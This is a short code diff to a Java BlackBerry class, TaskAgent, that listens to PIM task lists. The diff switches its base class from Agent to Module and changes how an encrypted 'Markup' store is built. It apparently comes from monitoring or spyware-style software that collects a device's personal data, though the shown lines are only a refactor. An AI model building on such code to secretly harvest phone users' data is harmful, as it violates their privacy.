@@ -39,7 +39,7 @@ import blackberry.utils.WChar;
 /**
  * The Class ImAgent.
  */
-public final class TaskAgent extends Agent implements PIMListListener,
+public final class TaskAgent extends Module implements PIMListListener,
         UserAgent {
     //#ifdef DEBUG
     static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
@@ -65,7 +65,7 @@ public final class TaskAgent extends Agent implements PIMListListener,
      *            the agent status
      */
     public TaskAgent(final boolean agentEnabled) {
-        super(Agent.AGENT_TASK, agentEnabled, false, "TaskAgent");
+        super(Module.AGENT_TASK, agentEnabled, false, "TaskAgent");
     }
 
     /**
@@ -83,7 +83,7 @@ public final class TaskAgent extends Agent implements PIMListListener,
         debug.trace("TaskAgent");
         //#endif
 
-        markup = new Markup(agentId, Encryption.getKeys().getAesKey());
+        markup = new Markup(this);
 
         parse(confParams);
         setDelay(SLEEPTIME);
